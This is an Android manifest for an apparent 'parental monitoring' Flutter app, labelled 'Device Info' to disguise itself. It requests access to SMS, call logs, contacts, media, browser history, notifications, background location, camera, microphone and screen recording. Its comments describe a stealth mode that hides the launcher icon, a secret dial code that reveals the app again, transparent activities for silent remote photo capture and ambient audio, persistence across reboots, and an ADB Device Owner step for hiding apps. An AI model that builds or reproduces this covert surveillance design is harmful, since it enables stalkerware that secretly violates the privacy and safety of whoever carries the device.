<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- ── Network ──────────────────────────────────────────────────────── -->
    <!-- Future backend sync -->
    <uses-permission android:name="android.permission.INTERNET" />
    <!-- Pre-flight connectivity check before sync attempt -->
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <!-- Prefer WiFi sync -->
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />

    <!-- ── Location ─────────────────────────────────────────────────────── -->
    <!-- Standard GPS / network-fused location -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <!--
        Background location (Android 10+).
        Must be requested SEPARATELY after foreground location is granted.
        Android 11+: user must go to Settings; "Allow all the time" is removed
        from the in-app dialog.
    -->
    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />

    <!-- ── Foreground service ────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <!--
        API 34+: must declare specific foreground service types.
        We use location (GPS) + dataSync (future batch uploads).
    -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />

    <!-- ── Boot receiver ────────────────────────────────────────────────── -->
    <!-- Auto-restart tracking after device reboot -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />

    <!-- ── Stealth mode: kill launcher so it restarts with a fresh icon list ── -->
    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />

    <!-- ── Wake lock ─────────────────────────────────────────────────────── -->
    <!-- Prevent CPU sleep during background location fix -->
    <uses-permission android:name="android.permission.WAKE_LOCK" />

    <!-- ── Battery optimisation ─────────────────────────────────────────── -->
    <!--
        Lets us request exemption from Doze / battery optimisation.
        Directs user to Settings; cannot force-grant programmatically.
    -->
    <uses-permission
        android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

    <!-- ── Usage stats ───────────────────────────────────────────────────── -->
    <!--
        Protected/signature permission — cannot be auto-granted.
        User must navigate to: Settings → Apps → Special App Access → Usage Access
    -->
    <uses-permission
        android:name="android.permission.PACKAGE_USAGE_STATS"
        tools:ignore="ProtectedPermissions" />

    <!-- ── Installed apps ───────────────────────────────────────────────── -->
    <!--
        API 30+: required to query / iterate all installed packages.
        Note: Google Play has restrictions; acceptable for private/sideloaded APK.
    -->
    <uses-permission
        android:name="android.permission.QUERY_ALL_PACKAGES"
        tools:ignore="QueryAllPackagesPermission" />

    <!-- ── Notification access ──────────────────────────────────────────── -->
    <!--
        No <uses-permission> tag needed — binding is declared on the service.
        User must grant via: Settings → Apps → Special App Access → Notification Access
    -->

    <!-- ── Browser history (AOSP / OEM browsers; Chrome/Firefox block on Android 10+) -->
    <uses-permission
        android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"
        tools:ignore="ProtectedPermissions" />

    <!-- ── Call log ───────────────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.READ_CALL_LOG" />

    <!-- ── SMS ────────────────────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.READ_SMS" />

    <!-- ── Contacts ────────────────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.READ_CONTACTS" />

    <!-- ── Media (Android 13+) ─────────────────────────────────────────────── -->
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
    <!-- Pre-Android 13 fallback -->
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
        android:maxSdkVersion="32" />

    <!-- ── Camera (remote photo capture command) ─────────────────────────────── -->
    <uses-permission android:name="android.permission.CAMERA" />
    <!-- Required on Android 14+ to use camera from a foreground service -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />

    <!-- ── Audio recording (mic ambient capture) ───────────────────────────── -->
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />

    <!-- ── Screen recording (MediaProjection) ────────────────────────────────── -->
    <!-- API 34+: explicit type required for any mediaProjection foreground service -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />

    <!-- ── Accessibility service (app blocking) ────────────────────────────── -->
    <!--
        Needed for AccessibilityMonitorService to enforce app block rules.
        User grants via: Settings → Accessibility → ParentGard
    -->
    <uses-permission
        android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"
        tools:ignore="ProtectedPermissions" />

    <application
        android:name="${applicationName}"
        android:label="Device Info"
        android:icon="@mipmap/ic_launcher"
        android:allowBackup="false"
        android:usesCleartextTraffic="true">

        <!-- ── Main Flutter activity ─────────────────────────────────── -->
        <!--
            MAIN+LAUNCHER is on this activity so Flutter's build tool can find
            the launch component. Stealth mode disables this activity at runtime
            via setComponentEnabledSetting — the icon disappears from the launcher.
        -->
        <!-- Activity has no LAUNCHER filter — always stays enabled so Flutter/ADB can start it directly -->
        <activity
            android:name="com.parentalmonitor.child.MainActivity"
            android:exported="true"
            android:launchMode="singleTop"
            android:theme="@style/LaunchTheme"
            android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
            android:hardwareAccelerated="true"
            android:windowSoftInputMode="adjustResize">

            <meta-data
                android:name="io.flutter.embedding.android.NormalTheme"
                android:resource="@style/NormalTheme" />
        </activity>

        <!-- Alias owns the LAUNCHER entry. Disabling it removes the icon immediately
             without touching MainActivity, so the app stays launchable by Flutter/ADB. -->
        <activity-alias
            android:name="com.parentalmonitor.child.LauncherAlias"
            android:targetActivity="com.parentalmonitor.child.MainActivity"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>

        <!-- ── Persistent tracking foreground service ────────────────── -->
        <!--
            foregroundServiceType must list all types the service uses.
            location  = GPS capture
            dataSync  = future background batch sync
        -->
        <service
            android:name="com.parentalmonitor.child.services.TrackingForegroundService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="location|dataSync|camera|microphone" />

        <!-- ── Boot / update receiver ────────────────────────────────── -->
        <receiver
            android:name="com.parentalmonitor.child.receivers.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                <category android:name="android.intent.category.DEFAULT" />
            </intent-filter>
        </receiver>

        <!-- ── Secret dial-code re-entry: *#*#94123#*#* re-reveals the app ── -->
        <receiver
            android:name="com.parentalmonitor.child.receivers.SecretCodeReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.provider.Telephony.SECRET_CODE" />
                <data android:scheme="android_secret_code" android:host="94123" />
            </intent-filter>
        </receiver>

        <!-- ── Notification listener service ─────────────────────────── -->
        <!--
            System binds this automatically once the user grants Notification Access.
            default_filter_types limits capture to conversation + alerting channels
            to reduce noise from silent system notifications.
        -->
        <service
            android:name="com.parentalmonitor.child.listeners.NotificationMonitorService"
            android:label="Notification Monitor"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <!-- ── Accessibility service (app blocking + foreground detection) ── -->
        <service
            android:name="com.parentalmonitor.child.services.AccessibilityMonitorService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true"
            android:enabled="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <!-- ── Screen record foreground service ─────────────────────────── -->
        <!--
            foregroundServiceType="mediaProjection" is required on API 34+ to use
            MediaProjection from a foreground service.
        -->
        <service
            android:name="com.parentalmonitor.child.services.ScreenRecordService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="mediaProjection" />

        <!-- ── Screen capture permission activity (transparent trampoline) ── -->
        <!--
            Shows the system "Start recording?" dialog, passes the projection
            token to ScreenRecordService, then finishes immediately.
        -->
        <activity
            android:name="com.parentalmonitor.child.activities.ScreenCaptureActivity"
            android:theme="@android:style/Theme.Translucent.NoTitleBar"
            android:exported="false"
            android:excludeFromRecents="true"
            android:noHistory="true" />

        <!-- ── Camera capture activity (transparent, no UI) ──────────────── -->
        <!--
            Used for remote photo capture commands. An Activity is used instead
            of calling Camera2 directly from the ForegroundService because OEM
            devices (Vivo, Xiaomi, OPPO) often block camera access from services.
            This activity is transparent and finishes itself immediately after capture.
        -->
        <activity
            android:name="com.parentalmonitor.child.activities.CameraCaptureActivity"
            android:theme="@android:style/Theme.Translucent.NoTitleBar"
            android:exported="false"
            android:excludeFromRecents="true"
            android:noHistory="true" />

        <!-- ── Device Owner receiver (enables setApplicationHidden for app hiding) ── -->
        <!--
            Set as Device Owner once via ADB:
            adb shell dpm set-device-owner com.parentalmonitor.child.debug/com.parentalmonitor.child.receivers.DeviceAdminReceiver
            After that, hide_app / show_app commands can truly hide any app from the launcher.
        -->
        <receiver
            android:name="com.parentalmonitor.child.receivers.DeviceAdminReceiver"
            android:exported="true"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <!-- Flutter embedding v2 marker -->
        <meta-data
            android:name="flutterEmbedding"
            android:value="2" />

    </application>
</manifest>
